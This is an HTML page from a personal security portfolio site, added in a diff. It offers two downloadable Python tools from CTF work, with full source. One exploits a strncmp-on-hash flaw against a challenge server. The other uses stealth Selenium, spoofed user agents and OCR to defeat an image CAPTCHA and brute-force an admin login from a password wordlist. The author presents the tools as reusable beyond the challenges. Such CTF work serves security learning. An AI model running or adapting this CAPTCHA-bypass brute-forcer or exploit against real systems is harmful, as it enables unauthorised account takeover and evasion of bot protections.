@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Scripts | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="Custom Python tools built during CTF and lab work. Source shown inline and downloadable.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/scripts/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/scripts/">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Scripts">
+<meta property="og:description" content="Custom Python tools built during CTF and lab work. Source shown inline and downloadable.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Scripts">
+<meta name="twitter:description" content="Custom Python tools built during CTF and lab work. Source shown inline and downloadable.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span>Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Scripts</h1>
+    <div class="post-description">Custom tools built during CTF and lab work. Source shown inline and downloadable.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>Each tool came out of a specific engagement and is written to be reusable beyond it. Source is shown inline and downloadable from this directory.</p>
+
+<hr>
+
+<h2>shapexpect.py</h2>
+
+<p>Automates exploitation of a binary-safe comparison bug. The target hashes both the server password and the user guess with SHA-256, then compares the digests with <code>strncmp()</code>. SHA-256 digests are raw bytes and can contain a null byte, and <code>strncmp()</code> treats a null byte as end-of-string. Feed the target guesses whose SHA-256 digest begins with <code>00</code>, and eventually the server's random digest also begins with <code>00</code> on the same round. <code>strncmp()</code> terminates early and reports a match.</p>
+
+<p>The tool spawns the remote service, generates candidates whose hashes start with a null byte, and feeds them in until the comparison collides.</p>
+
+<p>This single tool solved both the Easy and Hard challenges. Hard upgraded its password generation from <code>rand()</code> to <code>std::random_device</code>, but left the <code>strncmp()</code> comparison untouched. Only the <code>HOST</code> line changes between the two.</p>
+
+<p>Source: Guess Password (Easy and Hard). Download: <a href="/scripts/shapexpect.py">shapexpect.py</a></p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">pexpect</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">"guess-password-easy.2025-bq.ctfcompetition.com"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="s2">"1337"</span>
+
+<span class="k">def</span> <span class="nf">make_zero_hash_input</span><span class="p">():</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+        <span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">h</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">s</span>
+
+<span class="n">child</span> <span class="o">=</span> <span class="n">pexpect</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span>
+    <span class="sa">f</span><span class="s2">"nc </span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span>
+    <span class="n">encoding</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="p">,</span>
+    <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span>
+<span class="p">)</span>
+
+<span class="n">attempts</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="n">child</span><span class="o">.</span><span class="n">expect</span><span class="p">(</span><span class="s2">"Your guess:"</span><span class="p">)</span>
+
+    <span class="n">guess</span> <span class="o">=</span> <span class="n">make_zero_hash_input</span><span class="p">()</span>
+    <span class="n">attempts</span> <span class="o">+=</span> <span class="mi">1</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[</span><span class="si">{</span><span class="n">attempts</span><span class="si">}</span><span class="s2">] trying: </span><span class="si">{</span><span class="n">guess</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+
+    <span class="n">child</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">guess</span><span class="p">)</span>
+
+    <span class="n">child</span><span class="o">.</span><span class="n">expect</span><span class="p">([</span>
+        <span class="s2">"Wrong! Try again in a second..."</span><span class="p">,</span>
+        <span class="s2">"CTF\\</span><span class="si">{</span><span class="s2">.*\\}"</span><span class="p">,</span>
+        <span class="n">pexpect</span><span class="o">.</span><span class="n">EOF</span><span class="p">,</span>
+        <span class="n">pexpect</span><span class="o">.</span><span class="n">TIMEOUT</span>
+    <span class="p">])</span>
+
+    <span class="n">output</span> <span class="o">=</span> <span class="n">child</span><span class="o">.</span><span class="n">before</span> <span class="o">+</span> <span class="n">child</span><span class="o">.</span><span class="n">after</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="s2">"CTF{"</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">FLAG FOUND:"</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+        <span class="k">break</span></code></pre></div>
+
+<hr>
+
+<h2>CAPTCHA_goblin.py</h2>
+
+<p>Defeats an image-based CAPTCHA gate, then brute forces the login behind it. Selenium drives the browser, Tesseract OCR reads the CAPTCHA image into text, and the script submits the solved CAPTCHA alongside each password attempt, handling the CSRF token and the JavaScript login button per request.</p>
+
+<p>Source: CAPTCHApocolypse. Download: <a href="/scripts/CAPTCHA_goblin.py">CAPTCHA_goblin.py</a></p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="sd">"""
+CAPTCHA_goblin.py
+
+Selenium + Tesseract OCR CAPTCHA bypass tool. Iterates through a password
+wordlist, OCR-reads the CAPTCHA image rendered on the login page, and
+distinguishes between CAPTCHA failure (retries same password with fresh
+CAPTCHA) and password failure (moves on to next entry).
+
+Used in the CAPTCHApocolypse TryHackMe CTF.
+
+Dependencies:
+  sudo apt install tesseract-ocr chromium-driver
+  sudo apt install python3-selenium
+  pip install pytesseract pillow selenium-stealth fake-useragent --break-system-packages
+"""</span>
+
+<span class="kn">from</span> <span class="nn">selenium.webdriver.common.by</span> <span class="kn">import</span> <span class="n">By</span>
+<span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
+<span class="kn">from</span> <span class="nn">selenium.webdriver.chrome.options</span> <span class="kn">import</span> <span class="n">Options</span>
+<span class="kn">from</span> <span class="nn">selenium.webdriver.chrome.service</span> <span class="kn">import</span> <span class="n">Service</span>
+<span class="kn">from</span> <span class="nn">selenium_stealth</span> <span class="kn">import</span> <span class="n">stealth</span>
+
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">from</span> <span class="nn">fake_useragent</span> <span class="kn">import</span> <span class="n">UserAgent</span>
+<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span><span class="p">,</span> <span class="n">ImageEnhance</span><span class="p">,</span> <span class="n">ImageFilter</span>
+<span class="kn">import</span> <span class="nn">pytesseract</span>
+<span class="kn">import</span> <span class="nn">io</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="c1"># Create folder for saving CAPTCHA images</span>
+<span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="s2">"captchas"</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+
+<span class="n">options</span> <span class="o">=</span> <span class="n">Options</span><span class="p">()</span>
+<span class="n">ua</span> <span class="o">=</span> <span class="n">UserAgent</span><span class="p">()</span>
+<span class="n">userAgent</span> <span class="o">=</span> <span class="n">ua</span><span class="o">.</span><span class="n">random</span>
+<span class="n">options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'--no-sandbox'</span><span class="p">)</span>
+<span class="n">options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'--headless'</span><span class="p">)</span>
+<span class="n">options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">"start-maximized"</span><span class="p">)</span>
+<span class="n">options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="sa">f</span><span class="s1">'user-agent=</span><span class="si">{</span><span class="n">userAgent</span><span class="si">}</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'--disable-dev-shm-usage'</span><span class="p">)</span>
+<span class="n">options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'--disable-cache'</span><span class="p">)</span>
+<span class="n">options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'--disable-gpu'</span><span class="p">)</span>
+
+<span class="n">options</span><span class="o">.</span><span class="n">binary_location</span> <span class="o">=</span> <span class="s2">"/usr/bin/chromium"</span>
+<span class="n">service</span> <span class="o">=</span> <span class="n">Service</span><span class="p">(</span><span class="n">executable_path</span><span class="o">=</span><span class="s1">'/usr/bin/chromedriver'</span><span class="p">)</span>
+<span class="n">chrome</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">(</span><span class="n">service</span><span class="o">=</span><span class="n">service</span><span class="p">,</span> <span class="n">options</span><span class="o">=</span><span class="n">options</span><span class="p">)</span>
+
+<span class="n">stealth</span><span class="p">(</span><span class="n">chrome</span><span class="p">,</span>
+    <span class="n">languages</span><span class="o">=</span><span class="p">[</span><span class="s2">"en-US"</span><span class="p">,</span> <span class="s2">"en"</span><span class="p">],</span>
+    <span class="n">vendor</span><span class="o">=</span><span class="s2">"Google Inc."</span><span class="p">,</span>
+    <span class="n">platform</span><span class="o">=</span><span class="s2">"Win32"</span><span class="p">,</span>
+    <span class="n">webgl_vendor</span><span class="o">=</span><span class="s2">"Intel Inc."</span><span class="p">,</span>
+    <span class="n">renderer</span><span class="o">=</span><span class="s2">"Intel Iris OpenGL Engine"</span><span class="p">,</span>
+    <span class="n">fix_hairline</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+<span class="p">)</span>
+
+<span class="c1"># CONFIG</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="s1">'http://TARGET_IP'</span>
+<span class="n">login_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">'</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s1">/index.php'</span>
+<span class="n">dashboard_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">'</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s1">/dashboard.php'</span>
+
+<span class="n">username</span> <span class="o">=</span> <span class="s2">"admin"</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'top100.txt'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">passwords</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">]</span>
+
+<span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">chrome</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">login_url</span><span class="p">)</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+        <span class="c1"># Grab CSRF token</span>
+        <span class="n">csrf</span> <span class="o">=</span> <span class="n">chrome</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">NAME</span><span class="p">,</span> <span class="s2">"csrf_token"</span><span class="p">)</span><span class="o">.</span><span class="n">get_attribute</span><span class="p">(</span><span class="s2">"value"</span><span class="p">)</span>
+
+        <span class="c1"># Get CAPTCHA image rendered in-browser</span>
+        <span class="n">captcha_img_element</span> <span class="o">=</span> <span class="n">chrome</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">TAG_NAME</span><span class="p">,</span> <span class="s2">"img"</span><span class="p">)</span>
+        <span class="n">captcha_png</span> <span class="o">=</span> <span class="n">captcha_img_element</span><span class="o">.</span><span class="n">screenshot_as_png</span>
+
+        <span class="c1"># Preprocess image for OCR</span>
+        <span class="n">image</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">captcha_png</span><span class="p">))</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="s2">"L"</span><span class="p">)</span>
+        <span class="n">image</span> <span class="o">=</span> <span class="n">image</span><span class="o">.</span><span class="n">resize</span><span class="p">((</span><span class="n">image</span><span class="o">.</span><span class="n">width</span> <span class="o">*</span> <span class="mi">2</span><span class="p">,</span> <span class="n">image</span><span class="o">.</span><span class="n">height</span> <span class="o">*</span> <span class="mi">2</span><span class="p">),</span> <span class="n">Image</span><span class="o">.</span><span class="n">LANCZOS</span><span class="p">)</span>
+        <span class="n">image</span> <span class="o">=</span> <span class="n">image</span><span class="o">.</span><span class="n">filter</span><span class="p">(</span><span class="n">ImageFilter</span><span class="o">.</span><span class="n">SHARPEN</span><span class="p">)</span>
+        <span class="n">image</span> <span class="o">=</span> <span class="n">ImageEnhance</span><span class="o">.</span><span class="n">Contrast</span><span class="p">(</span><span class="n">image</span><span class="p">)</span><span class="o">.</span><span class="n">enhance</span><span class="p">(</span><span class="mf">2.0</span><span class="p">)</span>
+        <span class="n">image</span> <span class="o">=</span> <span class="n">image</span><span class="o">.</span><span class="n">point</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="mi">0</span> <span class="k">if</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="mi">140</span> <span class="k">else</span> <span class="mi">255</span><span class="p">,</span> <span class="s1">'1'</span><span class="p">)</span>
+
+        <span class="c1"># OCR the CAPTCHA</span>
+        <span class="n">captcha_text</span> <span class="o">=</span> <span class="n">pytesseract</span><span class="o">.</span><span class="n">image_to_string</span><span class="p">(</span>
+            <span class="n">image</span><span class="p">,</span>
+            <span class="n">config</span><span class="o">=</span><span class="s1">'--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'</span>
+        <span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">" "</span><span class="p">,</span> <span class="s2">""</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">""</span><span class="p">)</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+
+        <span class="c1"># Save the image for review</span>
+        <span class="n">image</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="sa">f</span><span class="s2">"captchas/captcha_</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="n">captcha_text</span><span class="si">}</span><span class="s2">.png"</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">captcha_text</span><span class="o">.</span><span class="n">isalnum</span><span class="p">()</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">captcha_text</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[!] OCR failed (got: '</span><span class="si">{</span><span class="n">captcha_text</span><span class="si">}</span><span class="s2">'), retrying..."</span><span class="p">)</span>
+            <span class="k">continue</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[*] Trying password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2"> with CAPTCHA: </span><span class="si">{</span><span class="n">captcha_text</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+
+        <span class="c1"># Fill out and submit the form</span>
+        <span class="n">chrome</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">NAME</span><span class="p">,</span> <span class="s2">"username"</span><span class="p">)</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+        <span class="n">chrome</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">NAME</span><span class="p">,</span> <span class="s2">"password"</span><span class="p">)</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+        <span class="n">chrome</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">NAME</span><span class="p">,</span> <span class="s2">"captcha_input"</span><span class="p">)</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="n">captcha_text</span><span class="p">)</span>
+        <span class="n">chrome</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">ID</span><span class="p">,</span> <span class="s2">"login-btn"</span><span class="p">)</span><span class="o">.</span><span class="n">click</span><span class="p">()</span>
+
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">dashboard_url</span> <span class="ow">in</span> <span class="n">chrome</span><span class="o">.</span><span class="n">current_url</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[+] Login successful with password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">flag</span> <span class="o">=</span> <span class="n">chrome</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">TAG_NAME</span><span class="p">,</span> <span class="s2">"p"</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[+] </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+            <span class="k">except</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">"[!] Logged in, but no flag found."</span><span class="p">)</span>
+            <span class="n">chrome</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
+            <span class="n">exit</span><span class="p">()</span>
+        <span class="k">elif</span> <span class="s2">"CAPTCHA incorrect"</span> <span class="ow">in</span> <span class="n">chrome</span><span class="o">.</span><span class="n">page_source</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[!] CAPTCHA wrong (got '</span><span class="si">{</span><span class="n">captcha_text</span><span class="si">}</span><span class="s2">'), retrying same password"</span><span class="p">)</span>
+            <span class="k">continue</span>  <span class="c1"># retry same password with fresh CAPTCHA</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[-] Failed login with: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+            <span class="k">break</span>  <span class="c1"># actual wrong password, try next</span>
+
+<span class="n">chrome</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+  </footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
